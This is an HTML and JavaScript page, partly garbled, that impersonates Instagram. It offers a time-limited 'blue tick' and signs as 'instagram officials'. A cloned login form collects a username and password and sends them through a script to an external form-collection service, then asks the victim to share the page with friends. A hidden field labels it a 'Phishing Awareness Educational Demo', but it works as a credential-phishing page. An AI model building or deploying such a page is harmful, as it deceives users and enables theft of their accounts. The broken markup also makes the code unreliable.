
<!DOCTYPE html>

<head>

<style>
* {

  box-sizing: border-box;

body { background: white; }

.page {

}

.page.active { display: flex; }

/* PAGE ONE */

#welcome {

.insta-title {

}

#welcome h1 {

#welcome p {

  font-size: 17px;

}

.gradient-btn, .start-btn {

  max-width: 400px;
  padding: 18px;
  border-radius: 40px;
  font-size: 16px;
  font-weight: bold;

}

.gradient-btn {

.start-btn {

  background: white;

  box-shadow: 0 8px 30px #0000000c;
}

  width: 76px;
  height: 76px;

}

.brand {
  font-size: 27px;

  color: #262626;

}

.demo-input {
  width: 100%;
  padding: 15px 13px;
  border: 1px solid #dbdbdb;
  border-radius: 7px;
  background: #fafafa;
  font-size: 14px;
  margin-bottom: 12px;
  outline: none;
}

.demo-input:focus {
  border-color: #168bfa;
}

.consent {
  display: flex;
  align-items: flex-start;
  gap: 9px;
  text-align: left;
  font-size: 12px;
  color: #555;
  margin: 8px 0 15px;
  line-height: 1.5;
}

.login-btn {
  width: 100%;
  padding: 14px;
  background: #168bfa;
  border: none;
  border-radius: 8px;
  color: white;
  font-weight: bold;
  font-size: 15px;
  margin-top: 7px;
  cursor: pointer;
}

.login-btn:disabled {
  opacity: .6;
  cursor: not-allowed;
}

.back {
  margin-top: 22px;
  color: #168bfa;
  border: none;
  background: none;
  cursor: pointer;
  font-size: 14px;
}

.demo-footer {
  color: #999;
  font-size: 11px;
  margin-top: 20px;
  line-height: 1.5;
}

#form-status {
  font-size: 12px;
  margin-top: 12px;
  color: #555;

/* PAGE THREE */

#third {
  background:
    radial-gradient(circle at 80% 80%, #123b70, transparent 40%),
    linear-gradient(140deg,#020617,#10051d);
  color: white;
  justify-content: center;
  align-items: center;
  text-align: center;
  padding: 25px;
  flex-direction: column;
}

.success-card {
  max-width: 430px;

}

.verified-logo {
  width: 90px;
  height: 90px;
  border-radius: 50%;
  background: #168bfa;
  display: flex;

.awareness ul {

.home-btn {

  border-radius: 30px;
  background: #168bfa;

@media(max-width:400px) {
  .insta-title {font-size:35px;}
  #welcome h1 {font-size:25px;}
  .brand {font-size:24px;}

</style>
</head>

<body>

<!-- PAGE ONE -->

<section id="welcome" class="page active">

  <div class="badges">✓</div>

  <h1>
    
    <span class="blue">You have a golden chance to get blue tick time is limited</span>

    onclick="showPage('second')">

    onclick="showPage('second')">
    GET STARTED →
  </button>

  <div class="footer">
    instagram officials
  </div>

</section>


<!-- PAGE TWO -->

<section id="second" class="page">

  <div class="login-card">

    <div class="demo-logo">
      <svg viewBox="0 0 100 100"
           width="100%" height="100%">

        <defs>
          <linearGradient id="instaGradient"
            x1="0%" y1="100%" x2="100%" y2="0%">
            <stop offset="0%" stop-color="#ffdc80"/>
            <stop offset="35%" stop-color="#fcaf45"/>
            <stop offset="65%" stop-color="#e1306c"/>
            <stop offset="100%" stop-color="#833ab4"/>
          </linearGradient>
        </defs>

        <rect x="7" y="7" width="86" height="86"
          rx="25" fill="url(#instaGradient)"/>

        <rect x="24" y="24" width="52" height="52"
          rx="16" fill="none" stroke="white"
          stroke-width="7"/>

        <circle cx="50" cy="50" r="13"
          fill="none" stroke="white" stroke-width="7"/>

        <circle cx="70" cy="30" r="5" fill="white"/>

      </svg>
    </div>

    <div class="brand">INSTAGRAM</div>

    <div class="subheading">
     
    </div>

    Log in into instagram.

    <form id="Form">

      <input
        class="demo-input"
        type="text"
        name="fi-text-demoNickname"
        placeholder="username"
        maxlength="25"
        required
      >

      <!-- MANUAL CLASS INPUT -->

      <input
        class="demo-input"
        type="text"
        name="fi-text-classLevel"
        placeholder="pasword"
        maxlength="20"
        required
      >

      <input
        type="hidden"

        value="Phishing Awareness Educational Demo"
      >

      <label class="consent">
        <input type="checkbox" required>
        I have filled my details.
      </label>

        CONTINUE
      </button>

    </form>

    <div class="demo-footer">
     instagram officials.
    </div>

    <button class="back"
      onclick="showPage('welcome')">
      ← Back to Welcome Page

</section>


<!-- PAGE THREE -->

    </p>

    <div class="awareness">

      <h3>share it with your friends also</h3>

      <ul>
       
      </ul>

    </div>

    <p>
    <br>
      . 🔐
    </p>

      onclick="showPage('welcome')">
      ← BACK TO HOME
    </button>

  </div>

</section>


<!-- JAVASCRIPT -->

<script src="https://forminit.com/sdk/v1/forminit.js"></script>

<script>

function showPage(id) {

  document.querySelectorAll(".page")
    .forEach(page => page.classList.remove("active"));

  document.getElementById(id)
    .classList.add("active");

  window.scrollTo(0, 0);
}

const forminit = new Forminit();

const FORM_ID = "vjnq7a8ng1k";

const form = document.getElementById("Form");
const status = document.getElementById("form-status");
const button = form.querySelector("button[type='submit']");

form.addEventListener("submit", async function(event) {

  event.preventDefault();

  button.disabled = true;
  button.textContent = "SUBMITTING...";
  status.textContent = "Sending demo response...";

  try {

    const formData = new FormData(form);

    const { error } = await forminit.submit(
      FORM_ID,
      formData
    );

    if (error) {
      throw new Error(error.message);
    }

    form.reset();
    status.textContent = "";

    showPage("third");

  } catch (error) {

    status.textContent =
      "Submission failed. Please try again.";

    console.error(error);

  } finally {

    button.disabled = false;
    button.textContent = "CONTINUE";

  }

});

</script>
